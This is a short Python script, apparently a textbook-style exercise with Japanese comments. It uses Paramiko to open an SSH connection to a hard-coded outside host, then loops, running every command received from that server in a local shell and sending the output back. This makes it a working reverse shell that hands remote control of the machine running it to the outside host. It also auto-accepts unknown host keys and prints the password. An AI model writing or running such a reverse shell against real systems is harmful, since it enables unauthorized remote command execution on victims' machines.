import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/Users/.ssh/keys')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(user)
    print(passwd)
    client.connect(ip, username=user, password=passwd, allow_agent=False,look_for_keys=False)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
    #バナー情報読み取り
    print(ssh_session.recv(1024))
    while True:
        #SSHサーバーからコマンド受け取り
        command = ssh_session.recv(1024)
        try:
            cmd_output = subprocess.check_output(command, shell=True)
            ssh_session.send(cmd_output)
        except Exception as e:
            ssh_session.send(str(e))
            print(str(e))

    client.close()
    return

ssh_command('100.100.100.100', 'user', 'pwd', 'ls')
